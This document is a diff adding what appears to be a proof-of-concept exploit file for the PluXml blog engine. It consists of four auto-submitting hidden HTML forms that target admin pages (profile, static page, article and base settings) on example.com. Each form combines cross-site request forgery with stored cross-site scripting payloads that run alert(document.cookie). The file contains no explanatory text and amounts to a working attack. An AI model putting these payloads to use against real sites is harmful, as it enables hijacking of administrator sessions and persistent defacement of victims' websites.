@@ -1,0 +1,65 @@
+&lt;form action=&quot;http://www.example.com/core/admin/profil.php&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;name&quot; value=&quot;Ildar&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;infos&quot; value='&lt;script&gt;alert(document.cookie)&lt;/script&gt;'&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;profil&quot; value=&quot;Modifier votre profil&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;password1&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;password2&quot; value=&quot;&quot;&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+
+&lt;form action=&quot;http://www.example.com/core/admin/statique.php&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;001&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;content&quot; value=&quot;&lt;p&gt;&lt;?php echo 'Ma premi&egrave;re page statique !'; ?&gt;&lt;/p&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+
+&lt;form action=&quot;http://www.example.com/core/admin/article.php&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;artId&quot; value=&quot;0001&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value=&quot;article title&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;author&quot; value=&quot;001&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;chapo&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;content&quot; value='page html content&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;'&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;day&quot; value=&quot;23&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;month&quot; value=&quot;09&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;year&quot; value=&quot;2010&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;time&quot; value=&quot;15:45&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;catId[]&quot; value=&quot;001&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;new_catid&quot; value=&quot;002&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;new_catname&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;tags&quot; value=&quot;PluXml&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;allow_com&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;url&quot; value=&quot;article-page-url&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;template&quot; value=&quot;article.php&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;preview&quot; value=&quot;Aper&ccedil;u&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+
+&lt;form action=&quot;http://www.example.com/core/admin/parametres_base.php&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+&lt;input type=&quot;hidden&quot; name=&quot;title&quot; value='PluXml&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;'&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;description&quot; value=&quot;le blog full XML&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;racine&quot; value=&quot;http://www.example.com/&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;delta&quot; value=&quot;+00:00&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;allow_com&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;mod_com&quot; value=&quot;0&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;editor&quot; value=&quot;plxtoolbar&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
